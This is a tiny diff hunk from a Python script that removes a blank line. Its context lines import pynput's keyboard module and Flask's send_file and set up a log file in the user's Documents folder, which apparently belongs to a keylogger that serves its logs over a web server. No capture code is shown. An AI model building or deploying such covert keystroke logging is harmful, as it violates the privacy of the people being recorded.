@@ -6,7 +6,6 @@ from pynput import keyboard
 from flask import Flask, request
 from flask import send_file
 
-
 # Log file in Documents folder
 documents_path = os.path.join(os.path.expanduser("~"), "Documents")
 os.makedirs(documents_path, exist_ok=True)
